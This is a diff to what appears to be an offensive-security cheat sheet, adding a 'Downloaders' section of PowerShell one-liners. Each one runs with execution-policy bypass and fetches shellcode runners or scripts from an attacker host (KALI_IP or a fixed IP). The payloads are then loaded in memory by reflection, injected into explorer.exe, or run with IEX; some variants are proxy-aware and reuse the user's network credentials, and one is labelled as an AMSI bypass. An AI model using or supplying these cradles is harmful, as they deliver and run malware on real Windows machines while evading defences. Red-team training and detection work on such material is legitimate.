@@ -211,6 +211,28 @@ $ass=[System.Reflection.Assembly]::Load($data)
 $ass.GetType("Runner.TestClass").GetMethod("Main").Invoke($null,@(,$null))
 
 ```
+---
+## Downloaders
+
+### DownloadData + Reflection (No Proxy aware)
+```
+powershell -nop -exec bypass -c "$data=(New-Object Net.WebClient).DownloadData('http://KALI_IP/shellcode_runner.dll|exe');$ass=[System.Reflection.Assembly]::Load($data);$ass.GetType('Runner.TestClass').GetMethod('Main').Invoke($null,@(,$null))"
+```
+
+### DownloadData + Invoke-ReflectivePEInjection
+```
+powershell -nop -exec bypass -c "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.136/shellcode_runner_assembly.exe');(New-Object System.Net.WebClient).DownloadString('http://KALI_IP/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid"
+```
+
+### DownloadString + AMSI Bypass + Proxy aware
+```
+powershell -nop -exec bypass -c "$proxyAddr=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | Select-Object ProxyServer).ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy(\"http://$proxyAddr\");$webclient=(New-Object System.Net.WebClient);$userAgent=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent';$webClient.Headers.Add(\"User-Agent\", $userAgent);$webClient.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$webClient.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;$bytes=$webclient.DownloadString('http://KALI_IP/shellcode_runner.txt')|IEX;"
+```
+
+### DownloadData + Proxy aware
+```
+powershell -nop -exec bypass -c "$proxyAddr=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | Select-Object ProxyServer).ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy(\"http://$proxyAddr\");$webclient=(New-Object System.Net.WebClient);$userAgent=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent';$webClient.Headers.Add(\"User-Agent\", $userAgent);$webClient.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$webClient.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;$data = $webclient.DownloadData('http://KALI_IP/shellcode_runner.dll|exe');$ass=[System.Reflection.Assembly]::Load($data);$ass.GetType('Runner.TestClass').GetMethod('Main').Invoke($null,@(,$null))"
+```
 
 ## Output
 If everything goes well, you will get an output as bellow:
